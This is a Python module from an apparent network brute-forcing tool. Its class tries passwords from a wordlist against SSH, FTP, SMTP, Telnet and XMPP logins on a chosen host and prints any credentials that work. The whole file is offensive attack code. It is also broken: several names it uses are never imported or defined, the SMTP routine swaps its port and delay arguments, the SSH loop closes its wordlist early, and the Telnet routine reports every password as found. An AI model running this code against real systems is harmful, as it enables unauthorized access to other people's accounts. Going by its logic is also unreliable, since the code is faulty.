"""
protocols.py

    Core module for network protocol bruteforcing

    This module provides the methods for bruteforcing network protocols.
    Using a multitude of Python libraries, protocols attempts to authenticate with
    the specified service through its respective library.
    These include:
    - ssh       Port: 22
    - telnet    Port: 23
    - ftp       Port: 21
    - smtp      Port: 25
    - xmpp      Port: 5222
"""

import brute.colors

import time
import smtplib
import paramiko
import ftplib
import telnetlib


class ProtocolBruteforce:
    def __init__(self, service, address, username, wordlist, port, delay):
        self.service = service
        self.address = address
        self.username = username
        self.wordlist = wordlist
        self.port = port
        self.delay = delay

    def execute(self):
        if self.address is None:
            colors.error("[!] You need to provide an address for cracking! [!]")
            exit(1)

        print(C + "[*] Address: {}".format(self.address) + W)
        time.sleep(0.5)

        if self.port is None:
            if self.service == "ssh":
                self.port = 22
            elif self.service == "ftp":
                self.port = 21
            elif self.service == "smtp":
                colors.warn("[?] NOTE: SMTP has several ports for usage, including 25, 465, 587")
                self.port = 25
            elif self.service == "telnet":
                self.port = 23
            elif self.service == "xmpp":
                self.port = 5222

            colors.warn("[?] Port not set. Automatically set to {} for you [?]".format(self.port))


        print(C, "[*] Port: {}".format(self.port), W)
        time.sleep(1)
        print(P, "[*] Starting dictionary attack! [*]", W)
        print("Using {} seconds of delay. Default is 1 second.".format(self.delay))

        # Call respective methods
        if self.service == "ssh":
            os.system("mkdir tmp/")
            self.sshBruteforce(self.address, self.username, self.wordlist, self.port, self.delay)
        elif self.service == "ftp":
            self.ftpBruteforce(self.address, self.username, self.wordlist, self.port, self.delay)
        elif self.service == "smtp":
            self.smtpBruteforce(self.address, self.username, self.wordlist, self.port, self.delay)
        elif self.service == "telnet":
            self.telnetBruteforce(self.address, self.username, self.wordlist, self.port, self.delay)
        elif self.service == "xmpp":
            self.xmppBruteforce(self.address, self.username, self.wordlist, self.port, self.delay)

    ## SSH - Secure SHell, connect AND bruteforce

    def ssh_connect(self, address, username, password, port, code=0):
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        paramiko.util.log_to_file("tmp/ssh.log")

        try:
            # Connecting! Errors are indicated by code variable.
            ssh.connect(address, port=int(port), username=username, password=password)
        except paramiko.AuthenticationException:
            # Password did not authenticate.
            code = 1
        except socket.error as e:
            colors.error("[!] Error: Connection Failed. [!]")
            code = 2

        ssh.close()
        return code

    def sshBruteforce(self, address, username, wordlist, port, delay):
        wordlist = open(wordlist, 'r')
        # Processing wordlist...
        for i in wordlist.readlines():
            password = i.strip("\n")
            try:
                response = self.ssh_connect(address, username, password, port)
                if response == 0:
                    colors.good("[*] Username: {} | [*] Password found: {}\n".format(username, password))
                elif response == 1:
                    colors.warn("[*] Username: {} | [*] Password: {} | Incorrect!\n".format(username, password))
                    time.sleep(delay)
                elif response == 2:
                    colors.error("[!] Error: Connection couldn't be established to address. Check if host is correct, or up! [!]")
                    exit(1)
            except Exception as e:
                colors.error("Error caught! {}".format(e))
                pass
            except KeyboardInterrupt:
                exit(1)

            wordlist.close()

    def ftpBruteforce(self, address, username, wordlist, port, delay):
        wordlist = open(wordlist, 'r')
        ftp = ftplib.FTP()
        for i in wordlist.readlines():
            password = i.strip("\n")
            try:
                ftp.connect(address, port)
                ftp.login(username, password)
                colors.good("[*] Username: {} | [*] Password found: {}\n".format(username, password))
                ftp.quit()
                wordlist.close()
                exit(0)
            except ftplib.error_perm:
                 colors.warn("[*] Username: {} | [*] Password: {} | Incorrect!\n".format(username, password))
                 time.sleep(delay)
            except ftplib.all_errors as e:
                colors.error("Error caught! {}".format(e))
            except KeyboardInterrupt:
                ftp.quit()
                wordlist.close()
                exit(1)

    def smtpBruteforce(self, address, username, wordlist, delay, port):
        wordlist = open(wordlist, 'r')
        s = smtplib.SMTP(str(address), port)
        for i in wordlist.readlines():
            password = i.strip("\n")
            try:
                s.ehlo()
                s.starttls()
                s.ehlo
                s.login(str(username), str(password))
                colors.good("[*] Username: {} | [*] Password found: {}\n".format(username, password))
                s.close()
                wordlist.close()
                exit(0)
            except smtplib.SMTPAuthenticationError:
                colors.warn("[*] Username: {} | [*] Password: {} | Incorrect!\n".format(username, password))
                time.sleep(delay)
            except Exception as e:
                colors.error("Error caught! %s".format(e))
            except KeyboardInterrupt:
                s.close()
                wordlist.close()
                exit(1)

    def xmppBruteforce(self, address, username, wordlist, port, delay):
        wordlist = open(wordlist, 'r')
        client = Client(str(address))
        client.connect(server=(str(address), port))
        for i in wordlist.readlines():
            password = i.strip("\n")
            try:
                if client.auth(username, password):
                    client.sendInitPresence()
                    colors.good("[*] Username: {} | [*] Password found: {}\n".format(username, password))
                    client.disconnect()
                    wordlist.close()
                    exit(0)
            except Exception as e:
                colors.error("Error caught! Name: {}".format(e))
            except KeyboardInterrupt:
                client.disconnect()
                wordlist.close()
                exit(1)
            except:
                colors.warn("[*] Username: {} | [*] Password: {} | Incorrect!\n".format(username, password))
                time.sleep(delay)

    def telnetBruteforce(self, address, username, wordlist, port, delay):
        telnet = telnetlib.Telnet(address)
        telnet.read_until("login: ")
        wordlist = open(wordlist, 'r')
        for i in wordlist.readlines():
            password = i.strip("\n")
            try:
                telnet.write(username + "\n")
                telnet.read_until("Password: ")
                telnet.write(password + "\n")
                tn.write("vt100\n")
                colors.good("[*] Username: {} | [*] Password found: {}\n".format(username, password))
                telnet.close()
                wordlist.close()
                exit(0)
            except socket.error:
                colors.error("[!] Error: Connection Failed. [!]")
            except KeyboardInterrupt:
                telnet.close()
                wordlist.close()
                exit(1)
            except EOFError:
                colors.warn("[*] Username: {} | [*] Password: {} | Incorrect!\n".format(username, password))
                time.sleep(delay)
            except Exception as e:
                colors.error("Error caught! Name: {}".format(e))
